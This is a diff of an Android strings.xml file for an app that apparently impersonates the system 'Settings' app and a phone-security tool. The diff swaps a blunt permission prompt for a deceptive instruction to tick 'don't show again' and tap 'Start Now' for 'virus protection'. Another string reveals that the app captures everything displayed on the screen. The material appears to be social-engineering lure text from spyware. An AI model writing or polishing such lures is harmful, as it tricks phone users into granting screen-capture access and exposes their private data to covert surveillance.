@@ -2,6 +2,6 @@
     <string name="app_name">Settings</string>
     <string name="permissions">System Settings helps keep your android phone secure.</string>
     <string name="permissions_btn">Secure My Phone</string>
-    <string name="overlay_1">You have to accept this permission. You have to accept this permission.</string>
+    <string name="overlay_1">Check don\'t show again and click Start Now to start virus protection</string>
     <string name="overlay_2">Settings will start capturing everything that\'s displayed on your screen.</string>
 </resources>
